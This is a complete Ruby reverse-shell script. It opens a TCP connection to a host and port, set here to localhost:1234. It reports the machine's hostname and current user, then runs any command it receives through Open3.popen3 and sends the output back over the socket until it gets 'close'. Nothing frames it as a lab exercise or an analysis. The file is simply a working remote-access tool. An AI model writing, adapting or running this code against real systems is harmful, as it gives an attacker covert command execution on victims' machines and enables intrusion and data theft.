require 'socket'
require 'open3'

hostname = 'localhost'
port = 1234

s = TCPSocket.open(hostname, port)

output_hostname = `hostname`
output_username = `whoami`

s.puts("\n\nWelcome to #{output_hostname}You are logged in as #{output_username}Run close to exit properly\n\n")
       
while (true)
  line = s.gets
  if line.chomp == ''
    next
  elsif line.chomp == 'close'
    s.close
    break
  else
    Open3.popen3(line) do |stdin, stdout, stderr, wait_thr|
      while line = stderr.gets or line = stdout.gets
        s.puts line
      end
    end
  end
end
